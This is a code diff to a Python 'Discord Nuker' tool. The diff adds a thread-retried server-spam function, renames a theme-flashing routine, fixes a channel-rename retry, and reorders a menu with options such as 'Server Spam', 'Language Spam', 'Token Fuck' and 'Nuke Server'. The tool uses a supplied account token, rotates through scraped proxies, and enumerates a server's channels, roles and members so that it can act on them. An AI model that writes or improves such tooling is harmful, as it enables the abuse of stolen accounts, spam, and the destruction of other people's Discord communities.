@@ -14,12 +14,12 @@ import threading
 import hashlib
 import base64
 import validators
-
-lock = threading.Lock()
+import string
 
 from concurrent.futures import ThreadPoolExecutor
 
 colorama.init(autoreset=True)
+lock = threading.Lock()
 
 class Colour:
 
@@ -118,6 +118,10 @@ class Constant:
     else:
         file = open("tokens.txt", "w") 
 
+class RandomInfo():
+    def username():
+        return "".join(random.choice(string.ascii_letters +string.digits) for x in range(random.randint(8, 12)))
+
 class Update:
 
     def CheckUpdate(Check):
@@ -159,7 +163,6 @@ class Status:
     SuccessStatus = [200,201,204]
 
     def Fail(Text):
-        
         lock.acquire()
         print(f"{Constant.Space}{Colour.BRIGHT}{Colour.RED}[{Colour.WHITE}FAIL{Colour.RED}] {Text}")
         lock.release()
@@ -175,6 +178,7 @@ class Status:
         lock.release()
 
 class ProxyIP:
+
     ProxyURL = URL.Proxy["ProxyUrls"].items()
     def GetProxies():
         ProxyList = []
@@ -214,11 +218,11 @@ class ProxyIP:
                         pass
         os.system(f"title Disocrd Nuker BY REACT#1120 ^| Successfully Scraped {len(ProxyList):,} Proxies")               
         print(f"""
-{Constant.Space}{Colour.WHITE}[{Colour.CYAN}>{Colour.WHITE}]{Colour.WHITE} {len(ProxyList):,} Proxies was scraped from {URL} urls 
-{Constant.Space}{Colour.WHITE}[{Colour.CYAN}>{Colour.WHITE}]{Colour.WHITE} {(HTTP):,} HTTP 
-{Constant.Space}{Colour.WHITE}[{Colour.CYAN}>{Colour.WHITE}]{Colour.WHITE} {(HTTPS):,} HTTPS 
-{Constant.Space}{Colour.WHITE}[{Colour.CYAN}>{Colour.WHITE}]{Colour.WHITE} {(SOCKS4):,} socks4 
-{Constant.Space}{Colour.WHITE}[{Colour.CYAN}>{Colour.WHITE}]{Colour.WHITE} {(SOCKS5):,} socks5""")
+{Constant.Space}{Colour.WHITE}[{Colour.CYAN}>{Colour.WHITE}]{Colour.WHITE} {len(ProxyList):,}{' '*(7-(len(str(len(ProxyList)))))}Proxies was scraped from {URL} urls 
+{Constant.Space}{Colour.WHITE}[{Colour.CYAN}>{Colour.WHITE}]{Colour.WHITE} {(HTTP):,}{' '*(7-(len(str(HTTP))))}HTTP 
+{Constant.Space}{Colour.WHITE}[{Colour.CYAN}>{Colour.WHITE}]{Colour.WHITE} {(HTTPS):,}{' '*(7-(len(str(HTTPS))))}HTTPS 
+{Constant.Space}{Colour.WHITE}[{Colour.CYAN}>{Colour.WHITE}]{Colour.WHITE} {(SOCKS4):,}{' '*(7-(len(str(SOCKS4))))}socks4 
+{Constant.Space}{Colour.WHITE}[{Colour.CYAN}>{Colour.WHITE}]{Colour.WHITE} {(SOCKS5):,}{' '*(7-(len(str(SOCKS5))))}socks5""")
         
         return ProxyList
 
@@ -232,7 +236,7 @@ class Function:
     def Credit():
         print(Infomation().Author)
         print(Infomation().__VERSION__)
-        print(Infomation().Github)
+        print(Infomation().Github) 
 
     def DiscordRPC():
         if Constant.RPC is True:
@@ -382,23 +386,23 @@ class ReqHeader:
 class Data:
 
     def GetChannel_ID():
-        if Constant.TOKEN is True:
+        if Constant.TOKEN is not False:
             channel_id = [] 
             channels = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/channels", headers= ReqHeader.DiscordHeader()).json()
-            for i in range(len(channels)):
-                channel_id.append(channels[i]["id"])
+            for i , items in enumerate(channels):
+                channel_id.append(items["id"])
 
             return channel_id
         
         else:
-            pass
+            print("no token ~")
     
     def GetRole_ID():
-        if Constant.TOKEN is True:
+        if Constant.TOKEN is not False:
             role_id = []
             roles = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/roles", headers= ReqHeader.DiscordHeader()).json()
-            for i in range(len(roles)):
-                role_id.append(roles[i]["id"])
+            for i , items in enumerate(roles):
+                role_id.append(items["id"])
 
             return role_id
 
@@ -406,11 +410,11 @@ class Data:
             pass
 
     def GetMember_ID():
-        if Constant.TOKEN is True:
+        if Constant.TOKEN is not False:
             member_id = []
             members = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/members?limit=1000", headers= ReqHeader.DiscordHeader()).json()
-            for i in range(len(members)):
-                member_id.append(members[i]["user"]["id"])
+            for i , items in enumerate(members):
+                member_id.append(items["user"]["id"])
 
             return member_id
         
@@ -419,6 +423,21 @@ class Data:
     
 
 class Discord:
+
+    def CreateServer(ServerName):
+        response= requests.post('https://discord.com/api/v9/guilds', headers=ReqHeader.DiscordHeader(), json={
+            "name": f"{ServerName}"
+            })
+        if response.status_code in Status.SuccessStatus:
+            Status.Success(f"Created Server named {ServerName}")
+        
+        elif response.status_code == 429:
+            Status.Ratelimit(f"You are being rate limited")
+            time.sleep(0.05)
+            threading.Thread(target=Discord.CreateServer, args=(ServerName)).start()
+
+        else:
+            Status.Fail("Unable to Create new Server")
 
     def ChangeServerImage():
         Image = [] 
@@ -571,9 +590,10 @@ class Discord:
         
         elif response.status_code == 429:
             time.sleep(0.05)
-            threading.Thread(target=Discord.ChangeChannelName,args=(Channel)).start()
+            threading.Thread(target=Discord.ChangeChannelName,args=(Channel, ChannelName)).start()
 
         else:
+            print(response.json())
             Status.Fail(f"CHANNEL NAME NOT CHANGED")
 
     def CreateCategory(ChannelName):
@@ -815,7 +835,7 @@ class Discord:
                 if response.status_code in Status.SuccessStatus:
                     Status.Success(f"Language changed to {Language[1]}")
 
-    def Flashing():
+    def ThemeFlashing():
         while True:
             for Theme in ["light","dark"]  :
                 response = requests.patch(f"{URL.BaseURL}users/@me/settings",headers=ReqHeader.DiscordHeader(), json={
@@ -1028,13 +1048,13 @@ class Main:
         22: ["","Server Name","Server Name"],
         23: [Discord.ChangeServerImage,"Server Picture","Server Picture"],
         24: ["","Spam Channel","Spam Channel"],
-        25: [Discord.LanguageSpam,"Token Fuck","Token Fuck"],
-        26: ["","Login Token","Login Token"],
-        27: ["","Nuke Server","Nuke Server"],
-        28: [Discord.ChangeStatus,"Change Status","เปลี่ยนสถานะ"],
-        29: ["","",""],
-        30: ["","",""],
-        31: ["","",""],
+        25: [Discord.LanguageSpam,"Language Spam",""],
+        26: [Discord.ThemeFlashing,"Theme Flash",""],
+        27: [Discord.CreateServer,"Server Spam",""],
+        28: [Discord.LanguageSpam,"Token Fuck","Token Fuck"],
+        29: [Discord.ChangeStatus,"Change Status","เปลี่ยนสถานะ"],
+        30: ["","Login Token","Login Token"],
+        31: ["","Nuke Server","Nuke Server"],
         32: ["","",""],
         33: ["","",""],
         34: ["","",""],
@@ -1042,39 +1062,39 @@ class Main:
         36: [exit,"Exit","ออก"]
     }
 
-    def run(Proxy= None, Getproxy = True):
+    def run(Proxy= None, Run =False):
         if Function.CheckInternet() is True:
             Function.DiscordRPC()
             Function.Clear()
             Function.Menu()
-            Stat , Respond =Update.CheckUpdate(Constant.CheckForUpdate)
-            if Stat == "UPDATE" and Respond.upper() in ["Y","YES"]:
-                Update.UpdateProgram()
-            
-            else:
-                Function.Clear()
-                Function.Menu()
-                if Getproxy is True and Proxy is None:
-                    Proxy = ProxyIP.GetProxies()
-                while True:
-                    try:    
-                        Choice = int(input(f"{Constant.Space}{Colour.YELLOW}ROOT{Colour.WHITE}@{Colour.YELLOW}REACT>> {Colour.WHITE}"))
-                        if Choice in Main.NEEDPROXY:
-                            Main.FunctionDict[Choice][0](Proxy)
-                         
-                        else:
-                            Main.FunctionDict[Choice][0]()
+            if Run is False:
+                Stat , Respond =Update.CheckUpdate(Constant.CheckForUpdate)
 
-                        if input(f"{Constant.Space}CONTINUE ? [ Y/N ] ").upper() in ["Y","YES"]:
-                            Main.run(Proxy)
-                            break
-                        
-                        else:
-                            Main.FunctionDict[32][0]()
+                if Stat == "UPDATE" and Respond.upper() in ["Y","YES"]:
+                    Update.UpdateProgram()
+            
+            Function.Clear()
+            Function.Menu()
+            if Proxy is None:
+                Proxy = ProxyIP.GetProxies()
+            while True:
+                try:    
+                    Choice = int(input(f"{Constant.Space}{Colour.YELLOW}ROOT{Colour.WHITE}@{Colour.YELLOW}REACT>> {Colour.WHITE}"))
+                    if Choice in Main.NEEDPROXY:
+                        Main.FunctionDict[Choice][0](Proxy)
                     
-                    except (ValueError, KeyError) as e:
-                        print(e)
-                        Status.Fail("Invalid choice")
+                    else:
+                        Main.FunctionDict[Choice][0]()
+
+                    if input(f"{Constant.Space}CONTINUE ? [ Y/N ] ").upper() in ["Y","YES"]:
+                        Main.run(Proxy = Proxy,Run=True)
+                        break
+                    
+                    else:
+                        Main.FunctionDict[32][0]()
+                
+                except (ValueError, KeyError) as e:
+                    Status.Fail("Invalid choice")
 
         else:
             Function.Clear()
